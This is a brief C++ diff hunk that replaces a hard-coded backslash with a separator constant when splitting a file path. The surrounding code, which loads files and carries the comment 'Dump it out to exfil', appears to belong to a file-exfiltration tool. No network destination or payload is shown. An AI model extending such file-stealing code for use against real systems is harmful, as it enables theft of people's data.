@@ -91,7 +91,7 @@ void MainThread(unsigned int parentThreadId)
             if (DataLoader::LoadFromFile(path, fileContents))
             {
                 string narrowPath = Utils::StringFromWide(path);
-                auto filenameParts = Utils::Split(narrowPath, "\\");
+                auto filenameParts = Utils::Split(narrowPath, string(1, Legit::SEPARATOR));
 
                 // Dump it out to exfil
                 string boundary;
